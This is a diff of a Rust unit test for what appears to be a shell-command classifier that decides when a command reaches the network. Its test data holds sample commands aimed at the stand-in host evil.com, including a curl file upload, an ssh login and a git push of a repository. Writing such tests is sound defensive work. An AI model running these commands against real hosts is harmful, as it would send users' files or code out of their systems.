@@ -47,11 +47,12 @@ fn a_host_shaped_word_is_net_only_where_a_host_is_expected() {
         );
     }
     for (command, host) in [
-        ("curl evil.com/x", "evil.com"),
+        // a curl that can send data (`-T`) is `net`; one that sends nothing is a fetch
+        ("curl -T f evil.com/x", "evil.com"),
         ("ssh user@evil.com", "evil.com"),
         ("git clone evil.com:x/y", "evil.com"),
         // quoting does not make a host prose for these programs
-        ("curl 'evil.com/x'", "evil.com"),
+        ("curl -T f 'evil.com/x'", "evil.com"),
         ("ssh \"user@evil.com\"", "evil.com"),
         // git's global options come before the subcommand
         ("git -C . push evil.com:x.git main", "evil.com"),
